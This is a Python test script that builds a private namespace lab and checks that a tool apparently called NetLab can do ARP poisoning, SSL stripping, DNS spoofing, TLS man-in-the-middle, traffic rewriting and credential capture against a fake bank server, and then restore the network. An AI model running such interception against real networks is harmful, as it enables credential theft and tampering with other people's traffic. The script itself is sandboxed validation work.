#!/usr/bin/env python3
"""End-to-end proof that NetLab's interception works, on a lab it builds itself.

Nothing here touches a real network: the script creates a
private bridge and two network namespaces, arms a NetLab engagement scoped to
exactly one address inside them, exercises every active module against it, and
tears the lab down again.  The engagement never names an interface or an
address that exists outside this script.

    python3 scripts/live_intercept_test.py          # in a user namespace
    sudo python3 scripts/live_intercept_test.py     # on the real host

Without root it re-executes itself inside an unprivileged user, network and
mount namespace, where it is root over its own private network stack and
cannot reach the real one at all.  Run under sudo to exercise the same code
against the host's own kernel paths instead.

What it proves, in order:

  1. the victim reaches the gateway normally before anything is armed
  2. ARP poisoning moves the victim's entry for the gateway onto our MAC
  3. redirected port 80 traffic lands in the SSL strip proxy, which rewrites
     https links, drops HSTS and removes the Secure cookie flag
  4. credentials posted over that connection are read
  5. a DNS name matching a spoof rule is answered with our address, and a
     name that does not match still gets the real answer
  6. TLS is terminated with a NetLab-minted certificate and the plaintext
     inside it is read
  7. disarming puts the victim's ARP entry, ip_forward and nftables back
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import textwrap
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

IN_NAMESPACE = os.environ.get("NETLAB_LAB_NS") == "1"

BRIDGE = "nlbr0"
NS_VICTIM = "nlvic"
NS_GATEWAY = "nlgw"
SUBNET = "10.77.0.0/24"
ATTACKER_IP = "10.77.0.13"
VICTIM_IP = "10.77.0.50"
GATEWAY_IP = "10.77.0.254"

PASS, FAIL, INFO = "  PASS ", "  FAIL ", "       "
results: list[tuple[bool, str, str]] = []


def check(ok: bool, title: str, detail: str = "") -> bool:
    results.append((bool(ok), title, detail))
    print("%s %-52s %s" % (PASS if ok else FAIL, title, detail))
    return bool(ok)


def packet_capture_works() -> bool:
    """Can this process actually *receive* on an AF_PACKET socket?

    Creating one and sending on it succeeds inside an unprivileged user
    namespace, but on a hardened kernel nothing is ever delivered back.  ARP
    poisoning needs the replies, so the test reports which half it was able
    to prove rather than a failure NetLab did not cause.
    """
    import socket as _socket
    run(["ip", "link", "set", "lo", "up"])     # a fresh netns starts with it down
    try:
        sock = _socket.socket(_socket.AF_PACKET, _socket.SOCK_RAW,
                              _socket.htons(3))
    except OSError:
        return False
    try:
        sock.bind(("lo", _socket.htons(3)))
        sock.settimeout(2.0)
        probe = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        try:
            probe.sendto(b"netlab-probe", ("127.0.0.1", 9))
        except OSError:
            return False
        finally:
            probe.close()
        try:
            sock.recv(2048)
            return True
        except OSError:
            return False
    except OSError:
        return False
    finally:
        sock.close()


def reexec_in_namespace() -> None:
    """Re-run this script as root over a private network stack.

    `--map-root-user` makes us uid 0 inside a user namespace, which carries
    CAP_NET_RAW and CAP_NET_ADMIN over the *new* network namespace and none
    at all over the real one.  The mount namespace is what lets `ip netns`
    have a writable /run/netns without touching the host's.
    """
    argv = ["unshare", "--user", "--map-root-user", "--net", "--mount",
            "--propagation", "private", sys.executable,
            os.path.abspath(__file__)] + sys.argv[1:]
    print("not root: re-executing inside a private user/net/mount namespace")
    os.execvpe("unshare", argv, dict(os.environ, NETLAB_LAB_NS="1"))


def ensure_netns_dir() -> None:
    """`ip netns` needs a writable /run/netns; give it a private one."""
    path = Path("/run/netns")
    if path.is_dir() and os.access(path, os.W_OK):
        return
    if not IN_NAMESPACE:
        raise RuntimeError("/run/netns is not writable")
    # Safe only because we are in our own mount namespace: this tmpfs is
    # invisible to the rest of the system and disappears with the process.
    run(["mount", "-t", "tmpfs", "none", "/run"], check_rc=True)
    path.mkdir(parents=True, exist_ok=True)


def wait_for_port(host: str, port: int, timeout: float = 20.0) -> bool:
    import socket as _socket
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with _socket.create_connection((host, port), timeout=1.0):
                return True
        except OSError:
            time.sleep(0.25)
    return False


def run(argv, check_rc=False, timeout=30, **kw):
    proc = subprocess.run(argv, capture_output=True, text=True,
                          timeout=timeout, **kw)
    if check_rc and proc.returncode != 0:
        raise RuntimeError("%s failed: %s" % (" ".join(argv),
                                              proc.stderr.strip()))
    return proc


def ns(name, argv, **kw):
    return run(["ip", "netns", "exec", name] + argv, **kw)


# --------------------------------------------------------------------- lab

LAB_SERVER = textwrap.dedent('''
    """The lab's gateway: HTTP that links to HTTPS, HTTPS, and a resolver."""
    import http.server, ssl, socket, struct, threading, subprocess, sys

    HTTP_PAGE = (b"<!doctype html><html><body><h1>Lab Bank</h1>"
                 b"<p>Balans: 5000000</p>"
                 b'<a href="https://bank.lab.local/login">Kirish</a>'
                 b'<script src="https://cdn.lab.local/a.js" '
                 b'integrity="sha384-XX"></script></body></html>')
    TLS_PAGE = b"<html><body>SECRET-INSIDE-TLS Hisob: 9999999</body></html>"

    class H(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"
        def log_message(self, *a): pass
        def _reply(self, body):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Strict-Transport-Security", "max-age=31536000")
            self.send_header("Set-Cookie", "SESSION=lab-abc; Path=/; Secure")
            self.end_headers(); self.wfile.write(body)
        def do_GET(self):
            self._reply(TLS_PAGE if self.server.tls else HTTP_PAGE)
        def do_POST(self):
            body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
            sys.stderr.write("origin saw POST %r\\n" % body[:120])
            sys.stderr.flush()
            self._reply(b"ok")

    def serve(port, tls):
        srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), H)
        srv.tls = tls
        if tls:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain("/tmp/nl-origin.crt", "/tmp/nl-origin.key")
            srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
        srv.serve_forever()

    def dns():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(("0.0.0.0", 53))
        real = socket.inet_aton("203.0.113.77")
        while True:
            data, peer = s.recvfrom(2048)
            if len(data) < 13: continue
            pos = 12
            while pos < len(data) and data[pos]: pos += data[pos] + 1
            pos += 1
            if pos + 4 > len(data): continue
            qtype = struct.unpack_from("!H", data, pos)[0]
            end = pos + 4
            txid = struct.unpack_from("!H", data, 0)[0]
            out = struct.pack("!HHHHHH", txid, 0x8180, 1,
                              1 if qtype == 1 else 0, 0, 0) + data[12:end]
            if qtype == 1:
                out += b"\\xc0\\x0c" + struct.pack("!HHIH", 1, 1, 30, 4) + real
            s.sendto(out, peer)

    subprocess.run(["openssl","req","-x509","-newkey","rsa:2048","-nodes",
                    "-days","2","-keyout","/tmp/nl-origin.key",
                    "-out","/tmp/nl-origin.crt","-subj","/CN=bank.lab.local"],
                   check=True, stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)
    for fn, args in ((serve,(80,False)), (serve,(443,True)), (dns,())):
        threading.Thread(target=fn, args=args, daemon=True).start()
    sys.stderr.write("lab gateway ready\\n"); sys.stderr.flush()
    threading.Event().wait()
''')


def teardown(quiet=True):
    for name in (NS_VICTIM, NS_GATEWAY):
        run(["ip", "netns", "del", name])
    run(["ip", "link", "del", BRIDGE])
    run(["nft", "delete", "table", "inet", "netlab"])
    for path in ("/tmp/nl-origin.crt", "/tmp/nl-origin.key",
                 "/tmp/nl-lab-server.py"):
        try:
            os.unlink(path)
        except OSError:
            pass
    if not quiet:
        print("lab torn down")


def setup(routed: bool = False):
    teardown()
    ensure_netns_dir()
    run(["ip", "link", "add", BRIDGE, "type", "bridge"], check_rc=True)
    run(["ip", "addr", "add", "%s/24" % ATTACKER_IP, "dev", BRIDGE],
        check_rc=True)
    run(["ip", "link", "set", BRIDGE, "up"], check_rc=True)

    for netns, ip, host_if, ns_if in ((NS_VICTIM, VICTIM_IP, "nlv0", "nlv1"),
                                      (NS_GATEWAY, GATEWAY_IP, "nlg0", "nlg1")):
        run(["ip", "netns", "add", netns], check_rc=True)
        run(["ip", "link", "add", host_if, "type", "veth",
             "peer", "name", ns_if], check_rc=True)
        run(["ip", "link", "set", host_if, "master", BRIDGE], check_rc=True)
        run(["ip", "link", "set", host_if, "up"], check_rc=True)
        run(["ip", "link", "set", ns_if, "netns", netns], check_rc=True)
        ns(netns, ["ip", "addr", "add", "%s/24" % ip, "dev", ns_if],
           check_rc=True)
        ns(netns, ["ip", "link", "set", ns_if, "up"], check_rc=True)
        ns(netns, ["ip", "link", "set", "lo", "up"], check_rc=True)

    # Normally the victim routes through the gateway, which is what makes
    # poisoning its entry for the gateway worth doing.  In routed mode it is
    # pointed at the attacker directly: the same packets arrive on the same
    # interface and take the same path through nftables and the proxies, with
    # the ARP step supplied by the routing table instead of by forgery.
    ns(NS_VICTIM, ["ip", "route", "add", "default", "via", GATEWAY_IP])
    if routed:
        # The gateway is on the victim's own subnet, so a default route would
        # never be consulted for it: the victim would ARP for the gateway and
        # send straight there.  A host route is what puts the attacker in the
        # middle, and it leaves the victim in exactly the state a successful
        # poisoning would -- frames for the gateway addressed to us.
        ns(NS_VICTIM, ["ip", "route", "add", "%s/32" % GATEWAY_IP,
                       "via", ATTACKER_IP])

    Path("/tmp/nl-lab-server.py").write_text(LAB_SERVER)
    server = subprocess.Popen(
        ["ip", "netns", "exec", NS_GATEWAY, sys.executable,
         "/tmp/nl-lab-server.py"],
        stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    if not wait_for_port(GATEWAY_IP, 80, timeout=45):
        raise RuntimeError("the lab gateway never came up on port 80")
    wait_for_port(GATEWAY_IP, 443, timeout=15)
    return server


def read_sysctl(key: str) -> str:
    try:
        return Path("/proc/sys/" + key.replace(".", "/")).read_text().strip()
    except OSError:
        return ""


def link_mac(interface: str, netns: str = "") -> str:
    """A device's MAC, read through `ip` rather than sysfs.

    /sys/class/net is the host's view even inside a new network namespace
    unless sysfs is remounted, so asking the kernel directly is both correct
    and one fewer mount to manage.
    """
    argv = ["ip", "-j", "link", "show", "dev", interface]
    proc = ns(netns, argv) if netns else run(argv)
    try:
        return json.loads(proc.stdout)[0]["address"].lower()
    except (ValueError, KeyError, IndexError):
        return ""


def touch_gateway() -> None:
    """Make the victim resolve the gateway, so its ARP entry is current."""
    ns(NS_VICTIM, ["curl", "-s", "-o", "/dev/null", "--max-time", "4",
                   "http://%s/" % GATEWAY_IP])


def victim_arp(ip):
    out = ns(NS_VICTIM, ["ip", "-o", "neigh", "show", ip]).stdout
    parts = out.split()
    return parts[parts.index("lladdr") + 1].lower() if "lladdr" in parts else ""


def victim_curl(url, *extra, timeout=15):
    argv = ["curl", "-s", "-i", "--max-time", "10", url] + list(extra)
    return ns(NS_VICTIM, argv, timeout=timeout).stdout


def victim_dns(name, server=GATEWAY_IP):
    script = textwrap.dedent('''
        import socket, struct, sys
        name, server = sys.argv[1], sys.argv[2]
        q = b"".join(bytes([len(l)]) + l.encode() for l in name.split("."))
        pkt = struct.pack("!HHHHHH", 0x4242, 0x0100, 1, 0, 0, 0) + q + b"\\x00" \\
              + struct.pack("!HH", 1, 1)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(5)
        s.sendto(pkt, (server, 53))
        data, _ = s.recvfrom(2048)
        print(socket.inet_ntoa(data[-4:]) if struct.unpack_from("!H",data,6)[0]
              else "NXDOMAIN")
    ''')
    return ns(NS_VICTIM, ["python3", "-c", script, name, server],
              timeout=20).stdout.strip()


# -------------------------------------------------------------------- main

def main() -> int:
    for tool in ("ip", "nft", "curl", "openssl", "unshare"):
        if not shutil.which(tool):
            print("missing required tool: %s" % tool)
            return 2

    from netlab.intercept.scope import Engagement
    from netlab.intercept.session import InterceptSession

    print("=" * 78)
    print("NetLab live interception test  --  private lab, %s" % SUBNET)
    print("running as uid %d%s" % (os.geteuid(),
                                   " in a private namespace" if IN_NAMESPACE
                                   else " on the host"))
    print("=" * 78)

    routed = "--routed" in sys.argv
    if not routed and not packet_capture_works():
        routed = True
        print()
        print("! AF_PACKET receive does not work here, so ARP poisoning cannot")
        print("! be exercised. Falling back to routed mode: the victim reaches")
        print("! the gateway through the attacker by route instead of by")
        print("! forgery, so every other part of the interception path -- the")
        print("! redirects, the proxies, DNS, TLS, credentials, teardown --")
        print("! is still driven end to end. Run under sudo on the host to")
        print("! cover ARP poisoning as well.")
        print()

    server = setup(routed=routed)
    session = None
    events: list[tuple[str, dict]] = []
    try:
        gateway_mac = link_mac("nlg1", NS_GATEWAY)
        attacker_mac = link_mac(BRIDGE)
        print("\n[lab]   attacker %s (%s)  victim %s  gateway %s (%s)\n"
              % (ATTACKER_IP, attacker_mac, VICTIM_IP, GATEWAY_IP, gateway_mac))

        # 1 -- baseline
        baseline = victim_curl("http://%s/" % GATEWAY_IP)
        check("Lab Bank" in baseline,
              "victim reaches the gateway before arming",
              "%d bytes" % len(baseline))
        touch_gateway()
        check(victim_arp(GATEWAY_IP) == gateway_mac,
              "victim's ARP entry points at the real gateway",
              victim_arp(GATEWAY_IP))
        forward_before = read_sysctl("net.ipv4.ip_forward")
        # Put both hosts in the kernel's neighbour cache so the engagement can
        # resolve them without depending on packet-socket replies.
        run(["ping", "-c1", "-W2", VICTIM_IP])
        run(["ping", "-c1", "-W2", GATEWAY_IP])

        # 2 -- arm
        engagement = Engagement.create("live-intercept-test", BRIDGE,
                                       GATEWAY_IP, VICTIM_IP,
                                       note="scripted validation")
        engagement.authorised = True
        engagement.authorisation_text = "scripts/live_intercept_test.py"
        session = InterceptSession(engagement, {
            "arp_poison": not routed, "sslstrip": True, "ssl_mitm": True,
            "dns_spoof": True, "dhcp": False, "cookie_killer": False,
            "carve_files": True, "poison_interval": 1.0,
            "upstream_dns": GATEWAY_IP,
            "dns_rules": [{"pattern": "*.bank.lab", "address": ATTACKER_IP}],
            "changer_rules": [{"pattern": "5000000", "replacement": "1",
                               "direction": "response"}],
        }, on_event=lambda n, d: events.append((n, d)))
        status = session.arm()
        print()
        check(status["armed"], "engagement armed",
              ", ".join(status["modules"]))
        check(VICTIM_IP in status["targets"],
              "scope resolved the target's hardware address",
              status["targets"].get(VICTIM_IP, "-"))
        check(bool(status["redirects"]), "nftables redirects installed",
              "; ".join(status["redirects"]))

        # 3 -- in the path
        time.sleep(2.0)
        if routed:
            print("%s ARP poisoning not exercised (routed mode)" % INFO)
        else:
            touch_gateway()
            time.sleep(1.5)
            poisoned = victim_arp(GATEWAY_IP)
            check(poisoned == attacker_mac,
                  "victim's ARP entry now points at the attacker",
                  "%s (was %s)" % (poisoned, gateway_mac))

        # 4 -- SSL strip
        stripped = victim_curl("http://%s/" % GATEWAY_IP)
        head, _, body = stripped.partition("\n\n")
        check("http://bank.lab.local/login" in stripped
              and "https://" not in body,
              "SSL strip rewrote the https links")
        check("strict-transport-security" not in head.lower(),
              "HSTS header removed from the response")
        check("Secure" not in [l for l in head.splitlines()
                               if l.lower().startswith("set-cookie")][0]
              if any(l.lower().startswith("set-cookie")
                     for l in head.splitlines()) else False,
              "Secure flag stripped from Set-Cookie")
        check("integrity=" not in stripped,
              "subresource integrity attribute removed")
        check("Balans: 1" in stripped,
              "traffic changer rewrote the body in flight")

        # 5 -- credentials
        victim_curl("http://%s/auth" % GATEWAY_IP, "-d",
                    "login=erwin&password=Live-MITM-2026", "-u", "svc:svcpw")
        time.sleep(0.8)
        creds = session.credentials
        secrets = {(c.get("user"), c.get("password")) for c in creds}
        check(("erwin", "Live-MITM-2026") in secrets,
              "form credentials read out of the stripped session",
              "%d credential(s) total" % len(creds))
        check(("svc", "svcpw") in secrets,
              "HTTP Basic credentials read out of the stripped session")

        # 6 -- DNS
        spoofed = victim_dns("www.bank.lab")
        check(spoofed == ATTACKER_IP,
              "matching DNS name answered with the attacker's address",
              spoofed)
        honest = victim_dns("unrelated.example")
        check(honest == "203.0.113.77",
              "unmatched DNS name still got the real answer", honest)

        # 7 -- SSL MITM
        ca_path = session.ca.cert_path
        tls_out = victim_curl("https://%s/" % GATEWAY_IP,
                              "--cacert", str(ca_path),
                              "--resolve", "bank.lab.local:443:%s" % GATEWAY_IP)
        check("SECRET-INSIDE-TLS" in tls_out,
              "TLS terminated with a NetLab certificate and read",
              "CA %s" % Path(ca_path).name)
        victim_curl("https://%s/login" % GATEWAY_IP, "--cacert", str(ca_path),
                    "-d", "user=tlsuser&password=Inside-TLS-9")
        time.sleep(0.8)
        tls_secrets = {(c.get("user"), c.get("password"))
                       for c in session.credentials if c.get("source") == "ssl-mitm"}
        check(("tlsuser", "Inside-TLS-9") in tls_secrets,
              "credentials read from inside the TLS session")

        untrusting = ns(NS_VICTIM, ["curl", "-s", "-o", "/dev/null", "-w",
                                    "%{http_code}", "--max-time", "8",
                                    "https://%s/" % GATEWAY_IP])
        check(untrusting.returncode != 0,
              "a client that does not trust the CA still refuses",
              "curl exit %d" % untrusting.returncode)

        # 8 -- restore
        print()
        report = session.disarm()
        session = None
        time.sleep(2.0)
        touch_gateway()
        time.sleep(1.0)
        if not routed:
            restored = victim_arp(GATEWAY_IP)
            check(report.get("arp_restored"), "disarm reported ARP restored")
            check(restored == gateway_mac,
                  "victim's ARP entry points at the real gateway again",
                  restored)
        check(report.get("redirects_removed"), "nftables redirects removed")
        check(run(["nft", "list", "table", "inet", "netlab"]).returncode != 0,
              "the netlab nftables table no longer exists")
        forward_after = read_sysctl("net.ipv4.ip_forward")
        check(forward_after == forward_before,
              "ip_forward restored to its original value",
              "%s -> %s" % (forward_before, forward_after))
        check("Lab Bank" in victim_curl("http://%s/" % GATEWAY_IP)
              and "https://bank.lab.local" in victim_curl("http://%s/" % GATEWAY_IP),
              "victim gets the untouched page again after disarm")

        audit = Path(engagement.directory() / "audit.jsonl")
        entries = [json.loads(l) for l in audit.read_text().splitlines()] \
            if audit.is_file() else []
        actions = {e["action"] for e in entries}
        expected = {"arm.begin", "arm.complete", "nft.install",
                    "disarm.begin", "disarm.complete"}
        if not routed:
            expected |= {"arp.poison.start", "arp.restore"}
        missing = expected - actions
        check(not missing, "audit log records the whole engagement",
              "%d entries, %d actions%s"
              % (len(entries), len(actions),
                 "; missing " + ", ".join(sorted(missing)) if missing else ""))
    finally:
        if session is not None:
            try:
                session.disarm()
            except Exception as exc:
                print("  !! disarm during cleanup failed: %s" % exc)
        if server is not None:
            server.terminate()
        teardown()

    print()
    print("=" * 78)
    passed = sum(1 for ok, _, _ in results if ok)
    print("%d/%d checks passed" % (passed, len(results)))
    for ok, title, _ in results:
        if not ok:
            print("  FAILED: %s" % title)
    print("=" * 78)
    return 0 if passed == len(results) else 1


if __name__ == "__main__":
    if os.geteuid() != 0:
        reexec_in_namespace()
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        teardown(quiet=False)
        raise SystemExit(130)
